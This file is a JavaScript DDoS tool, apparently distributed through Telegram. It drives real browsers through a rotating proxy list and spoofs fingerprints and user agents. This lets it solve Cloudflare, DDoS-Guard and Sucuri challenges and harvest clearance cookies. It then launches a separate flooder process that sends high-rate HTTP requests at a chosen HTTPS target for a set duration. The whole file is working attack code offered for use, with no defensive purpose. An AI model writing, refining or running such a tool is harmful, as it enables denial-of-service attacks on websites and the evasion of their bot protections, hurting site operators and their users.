import { connect } from 'puppeteer-real-browser';
import { FingerprintGenerator } from 'fingerprint-generator';
import { FingerprintInjector } from 'fingerprint-injector';
import timers from 'timers/promises';
import { spawn } from 'child_process';
import fs from 'fs';
import cluster from 'cluster';
import colors from 'colors';

process.on("uncaughtException", function (error) {
    console.log(error);
});
process.on("unhandledRejection", function (error) {
    console.log(error);
});

process.setMaxListeners(0);

if (process.argv.length < 7) {
    console.clear();
    console.log(`
  Telegram: t.me/bixd08 - JsBrowser

  Usage: 
      node browser.mjs target time thread rate proxyfile

  Option:
     --debug - enable debug mode(default: false)
     --headless - enable graphical mode(default: false)
     --auth - enable proxy mode with credentials in the format ip:port:username:password(default: false)
     --fingerprint - enable fingerprint creation and use(default: true)
     --threads - number of threads used in the flooder process(default: 1)
     --cookies - number of iterations to collect cookies(default: 0)
     --flooder - enable flood process running(default: false)
     --randmethod - enable random HTTP request method (GET, POST, HEAD)(default: false)
    `);
    process.exit(0);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
let rate = parseInt(process.argv[5]);
const proxyfile = process.argv[6];
let usedProxies = {};

function error(msg) {
    console.log(`   ${'['.red}${'error'.bold}${']'.red} ${msg}`);
    process.exit(0);
}

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

function exit() {
    for (const flooder of flooders) {
        flooder.kill();
    }
    log(1, `${'End!'.bold}`);
    process.exit(0);
}

process.on('SIGTERM', () => {
    exit();
}).on('SIGINT', () => {
    exit();
});

const options = [
    { flag: '--debug', value: get_option('--debug'), default: false },
    { flag: '--headless', value: get_option('--headless'), default: false },
    { flag: '--auth', value: get_option('--auth'), default: false },
    { flag: '--rate', value: get_option('--rate'), default: false },
    { flag: '--fingerprint', value: get_option('--fingerprint'), default: true },
    { flag: '--threads', value: get_option('--threads'), default: 1 },
    { flag: '--cookies', value: get_option('--cookies'), default: 0 },
    { flag: '--flooder', value: get_option('--flooder'), default: false },
    { flag: '--randmethod', value: get_option('--randmethod'), default: false },
];

function enabled(buf) {
    const flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);
    if (option === undefined) {
        return false;
    }

    const optionValue = option.value;

    if (optionValue === undefined && option.default) {
        return option.default;
    }

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    } else if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    } else {
        return false;
    }
}

if (!proxyfile) { error("Invalid proxy file!"); }
if (!target || !target.startsWith('https://')) { error("Invalid target address (https only)!"); }
if (!duration || isNaN(duration) || duration <= 0) { error("Invalid duration format!"); }
if (!threads || isNaN(threads) || threads <= 0) { error("Invalid threads format!"); }
if (!rate || isNaN(rate) || rate <= 0) { error("Invalid ratelimit format!"); }
const raw_proxies = fs.readFileSync(proxyfile, "utf-8").toString().replace(/\r/g, "").split("\n").filter((word) => word.trim().length > 0);
if (raw_proxies.length <= 0) { error("Proxy file is empty!"); }
const parsed = new URL(target);

function shuffle_proxies(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

const proxies = shuffle_proxies(raw_proxies);

const headless = enabled('headless') ? true : false;
const debug = enabled('debug') ? true : false;
const cookiesOpt = enabled('cookies');
const flooderOpt = enabled('flooder');
const randMethodOpt = enabled('randmethod');

const cache = [];
const flooders = [];

function log(type, string) {
    let script;
    switch (type) {
        case 1:
            script = "[JSBROWSER]";
            break;
        case 2:
            script = "[JSFLOODER]";
            break;
        default:
            script = "[STATUS]";
            break;
    }
    const d = new Date();
    const hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    const minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    const seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

    if (debug) {
        console.log(`(${`${hours}:${minutes}:${seconds}`.cyan}) [${colors.magenta.bold(script)}] | ${string}`);
    }
}

function random_int(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function flooder(headers, proxy, ua, cookie) {
    let THREADS = 1;
    const flooder_threads = enabled('threads');
    if (flooder_threads && !isNaN(flooder_threads) && typeof flooder_threads !== 'boolean') {
        THREADS = flooder_threads;
    }

    if (cookie.includes('cf_clearance') && rate > 90) {
        rate = 90;
    }

    const args = [
        "floodbr.js",
        "GET",
        target,
        duration,
        THREADS,
        rate,
        proxy,
        `${cookie}`,
        `${ua}`,
        "--debug"
    ];

    if (randMethodOpt) {
        args.push('--randmethod');
    }

    if (flooderOpt) {
        const flooder_process = spawn("node", args, { stdio: 'pipe' });
        flooders.push(flooder_process);

        flooder_process.stdout.on('data', (data) => {
            const output = data.toString().split('\n').filter(line => line.trim() !== '').join('\n');
            if (output.includes('Restart Browser')) {
                log(2, "Restarting Browser".bold);
                if (cache.length > 0) {
                    const random_index = Math.floor(Math.random() * cache.length);
                    const item = cache[random_index];
                    flooder(undefined, item["proxy"], item["ua"], item["cookie"]);
                    cache.splice(random_index, 1);
                } else {
                    main();
                }
                return;
            }
        });

        flooder_process.stderr.on('data', (data) => {
            flooder_process.kill();
        });

        flooder_process.on('error', (err) => {
            flooder_process.kill();
        });

        flooder_process.on('close', (code) => {
            flooder_process.kill();
        });
    }
}

async function sleep(duration) {
    await new Promise(resolve => setTimeout(resolve, duration));
}

async function isChallengeSolved(page, protections) {
    try {
        if (!page || page.isClosed()) return false;
        const title = await page.title();
        if (title && protections.some(p => title.toLowerCase().includes(p))) {
            return false;
        }

        const isSolved = await page.evaluate(() => {
            return document.readyState === 'complete' &&
                   !document.body.innerHTML.includes('Just a moment') &&
                   !document.body.querySelector('.cf-browser-verification') &&
                   !document.body.querySelector('[data-ray]') &&
                   document.body.children.length > 0;
        });

        const cookiesCheck = await page.evaluate(() => {
            const cfClearance = document.cookie.split(';').find(row => row.startsWith('cf_clearance='));
            const cfBM = document.cookie.split(';').find(row => row.startsWith('__cf_bm='));
            return (cfClearance && cfClearance.split('=')[1] && cfClearance.split('=')[1].length > 10) ||
                   (cfBM && cfBM.split('=')[1] && cfBM.split('=')[1].length > 10);
        });

        return isSolved && cookiesCheck;
    } catch (err) {
        return false;
    }
}

async function main(reserve, retries = 3) {
    return new Promise(async (resolve) => {
        let proxy = proxies[~~(Math.random() * proxies.length)];
        while (usedProxies[proxy] && retries > 0) {
            if (Object.keys(usedProxies).length === proxies.length) {
                usedProxies = {};
                break;
            }
            proxy = proxies[~~(Math.random() * proxies.length)];
        }
        usedProxies[proxy] = true;

        let [proxy_host, proxy_port] = proxy.split(':');
        let Browser, Page;

        if (debug) {
            console.log(`Start browser run with addressProxy: ${proxy_host}:${proxy_port}`);
        }

        try {
            const args = [];
            let headers;

            let proxy_plugin = {
                host: proxy_host,
                port: proxy_port
            };

            if (enabled('auth')) {
                let [host, port, username, password] = proxy.split(':');
                proxy_plugin = {
                    host: host,
                    port: parseInt(port),
                    username: username,
                    password: password
                };
            }

            const { page, browser } = await connect({
                turnstile: true,
                headless: headless,
                args: [],
                customConfig: {},
                connectOption: {},
                connectTimeout: 60000,
                ignoreAllFlags: false,
                proxy: proxy_plugin
            }).catch((err) => {
                if (retries > 0) {
                    log(1, `(${colors.magenta(proxy)}) ${colors.bold('Connection failed')}: Retrying... (${retries} attempts left)`);
                    delete usedProxies[proxy];
                    return main(reserve, retries - 1);
                }
                log(1, `(${colors.magenta(proxy)}) ${colors.bold('Error')}: ${err.message}`);
                resolve();
                return;
            });

            if (!browser || !page) {
                log(1, `(${colors.magenta(proxy)}) ${colors.bold('Error')}: Failed to initialize browser or page`);
                delete usedProxies[proxy];
                return main(reserve, retries - 1);
            }

            Browser = browser;
            Page = page;

            if (debug) {
                console.log("Proxy Connected....");
            }

            if (enabled('fingerprint')) {
                const version = random_int(1, 203);
                const fingerprintInjector = new FingerprintInjector();
                const fingerprintGenerator = new FingerprintGenerator({
                    devices: ['desktop'],
                    operatingSystems: ['windows']
                });
                const fingerprint = fingerprintGenerator.getFingerprint();
                const originalUA = fingerprint.headers['User-Agent'] || "";
                const newUA = [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                ];

                const randomIndex = Math.floor(Math.random() * newUA.length);
                const randomUA = newUA[randomIndex];
                fingerprint.headers['User-Agent'] = randomUA;
                headers = JSON.stringify(fingerprint.headers);
            }

            let userAgent = await page.evaluate(() => {
                return navigator.userAgent;
            }).catch((err) => {
                log(1, `(${colors.magenta(proxy)}) ${colors.bold('Error')}: Failed to get user agent - ${err.message}`);
                return null;
            });

            if (!userAgent || !browser.isConnected()) {
                log(1, `(${colors.magenta(proxy)}) ${colors.bold('Error')}: Browser disconnected or invalid user agent`);
                if (page && !page.isClosed()) await page.close();
                if (browser && browser.isConnected()) await browser.close();
                delete usedProxies[proxy];
                return main(reserve, retries - 1);
            }

            if (userAgent.includes("Headless")) {
                userAgent = userAgent.replace('Headless', '');
                await page.setUserAgent(userAgent);
            }

            let navigationSuccess = false;
            for (let attempt = 1; attempt <= 3; attempt++) {
                try {
                    await page.goto(target, { waitUntil: 'networkidle0', timeout: 45000 });
                    navigationSuccess = true;
                    break;
                } catch (err) {
                    log(1, `(${colors.magenta(proxy)}) ${colors.bold('Navigation failed')}: Attempt ${attempt}/3 - ${err.message}`);
                    if (attempt === 3) {
                        if (page && !page.isClosed()) await page.close();
                        if (browser && browser.isConnected()) await browser.close();
                        delete usedProxies[proxy];
                        return main(reserve, retries - 1);
                    }
                    await sleep(1000);
                }
            }

            if (!navigationSuccess) {
                log(1, `(${colors.magenta(proxy)}) ${colors.bold('Error')}: All navigation attempts failed`);
                if (page && !page.isClosed()) await page.close();
                if (browser && browser.isConnected()) await browser.close();
                delete usedProxies[proxy];
                return main(reserve, retries - 1);
            }

            const protections = [
                'just a moment...',
                'ddos-guard',
                '403 forbidden',
                'security check',
                'One more step',
                'Sucuri WebSite Firewall'
            ];

            const maxWaitTime = 30000;
            const pollInterval = 250;

            const titleCheckPromise = new Promise((resolve, reject) => {
                let pollCount = 0;
                const poll = async () => {
                    pollCount++;
                    try {
                        if (!page || page.isClosed() || !browser.isConnected()) {
                            clearInterval(interval);
                            reject(new Error("Page or browser closed unexpectedly"));
                            return;
                        }

                        const solved = await isChallengeSolved(page, protections);
                        if (solved) {
                            clearInterval(interval);
                            resolve(true);
                            return;
                        }

                        const title = await page.title();
                        if (title.startsWith("Failed to load URL ")) {
                            clearInterval(interval);
                            reject(new Error("Failed to load URL"));
                            return;
                        }

                        if (!title) {
                            titles.push(parsed.hostname);
                            clearInterval(interval);
                            resolve(true);
                            return;
                        }

                        if (title !== titles[titles.length - 1]) {
                            log(1, `(${colors.magenta(proxy)}) ${colors.bold('Title')}: ${colors.italic(title)} Found CloudFlare challenge`);
                        }

                        titles.push(title);

                        if (!protections.some(p => title.toLowerCase().includes(p))) {
                            clearInterval(interval);
                            resolve(true);
                            return;
                        }
                    } catch (err) {
                        if (pollCount >= 5) {
                            log(1, `(${colors.magenta(proxy)}) ${colors.bold('Error')}: Too many errors! - ${err.message}`);
                            clearInterval(interval);
                            reject(err);
                            return;
                        }
                    }
                };

                const interval = setInterval(poll, pollInterval);
                poll();

                setTimeout(() => {
                    clearInterval(interval);
                    reject(new Error("Timeout waiting for challenge solve"));
                }, maxWaitTime);
            });

            let titles = [];
            try {
                await titleCheckPromise;
                log(1, `(${colors.magenta(proxy)}) ${colors.bold('Challenge solved')}`);
            } catch (err) {
                log(1, `(${colors.magenta(proxy)}) ${colors.bold('Challenge failed')}: ${err.message}`);
                if (page && !page.isClosed()) await page.close();
                if (browser && browser.isConnected()) await browser.close();
                delete usedProxies[proxy];
                return main(reserve, retries - 1);
            }

            await timers.setTimeout(random_int(1000, 2000));

            const cookies = await page.cookies().catch((err) => {
                log(1, `(${colors.magenta(proxy)}) ${colors.bold('Error')}: Failed to get cookies - ${err.message}`);
                return [];
            });
            const _cookie = cookies.map((c) => `${c.name}=${c.value}`).join("; ");

            if (_cookie.includes('cf_clearance=') || _cookie.includes('__cf_bm=')) {
                const cfValue = _cookie.split('cf_clearance=')[1]?.split(';')[0] || _cookie.split('__cf_bm=')[1]?.split(';')[0];
                if (cfValue && cfValue.length < 10) {
                    log(1, `(${colors.magenta(proxy)}) ${colors.bold('Invalid cookie')}: Fake or empty clearance`);
                    if (page && !page.isClosed()) await page.close();
                    if (browser && browser.isConnected()) await browser.close();
                    delete usedProxies[proxy];
                    return main(reserve, retries - 1);
                }
            } else {
                log(1, `(${colors.magenta(proxy)}) ${colors.bold('Warning')}: No clearance cookie found, may be invalid`);
            }

            log(1, `(${colors.magenta(proxy)}) ${colors.bold('Cookie')}: ${colors.green(_cookie)}`);

            await sleep(500); // Small delay to ensure stability
            if (page && !page.isClosed()) await page.close();
            if (browser && browser.isConnected()) await browser.close();

            if (!reserve) {
                flooder(headers, proxy, userAgent, _cookie);
            } else {
                cache.push({
                    proxy: proxy,
                    ua: userAgent,
                    cookie: _cookie
                });
            }

            resolve();
        } catch (err) {
            log(1, `(${colors.magenta(proxy)}) ${colors.bold('Error')}: ${err.message}`);
            if (page && !page.isClosed()) await page.close();
            if (browser && browser.isConnected()) await browser.close();
            delete usedProxies[proxy];
            return main(reserve, retries - 1);
        }
    });
}

if (cluster.isPrimary) {
    setTimeout(() => {
        exit();
    }, Number(duration) * 1000);

    for (let i = 0; i < threads; i++) {
        main(false);
    }

    if (!isNaN(cookiesOpt) && typeof cookiesOpt !== 'boolean') {
        let x = 1;
        const cookie_interval = setInterval(() => {
            x++;
            if (x >= cookiesOpt) { clearInterval(cookie_interval); }
            main(true);
        }, 3000);
    }
}